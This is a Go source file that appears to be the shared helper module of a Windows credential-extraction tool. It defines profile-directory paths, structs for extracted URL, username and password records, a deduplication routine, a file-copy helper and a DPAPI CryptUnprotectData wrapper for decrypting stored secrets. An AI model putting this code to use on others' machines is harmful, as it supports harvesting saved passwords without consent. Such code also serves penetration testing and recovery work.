package common

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

var (
	/*
		Contain home directory of current user
	 */
	UserHome     = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")

	/*
		Contain path to %APPDATA% directory
	 */
	AppData      = os.Getenv("APPDATA")

	/*
		Contain path to %LOCALAPPDATA% directory
	 */
	LocalAppData = os.Getenv("LOCALAPPDATA")
)

/*
	Main struct for extracted credentials that contains a target url, login and password
 */
type UrlNamePass struct {
	Url      string
	Username string
	Pass     string
}

/*
	Struct for extracted credentials that contains only a login and password
 */
type NamePass struct {
	Name string
	Pass string
}


type ExtractCredentialsResult struct {
	Success bool
	Data    []UrlNamePass
}

type ExtractCredentialsNamePass struct {
	Success bool
	Data    []NamePass
}

func RemoveDuplicates(elements []UrlNamePass) []UrlNamePass {
	// Use map to record duplicates as we find them.
	encountered := map[string]bool{}
	result := []UrlNamePass{}

	for v := range elements {
		if encountered[elements[v].Pass+elements[v].Url+elements[v].Username] == true {
			// Do not add duplicate.
		} else {
			// Record this element as an encountered element.
			encountered[elements[v].Pass+elements[v].Url+elements[v].Username] = true
			// Append to result slice.
			result = append(result, elements[v])
		}
	}
	// Return the new slice.
	return result
}

func CopyFile(src string, dst string) error {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, data, 0644)
	if err != nil {
		return err
	}
	return nil
}

/*
	WinAPI decrypt function
*/
type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Win32CryptUnprotectData(cipherText string, entropy bool) string {
	var (
		dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
		dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

		procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
		procLocalFree   = dllkernel32.NewProc("LocalFree")
	)

	var outblob DATA_BLOB
	var inblob = NewBlob([]byte(cipherText))

	procDecryptData.Call(uintptr(unsafe.Pointer(inblob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return string(outblob.ToByteArray())
}

/*
	End WinAPI decrypt function
*/
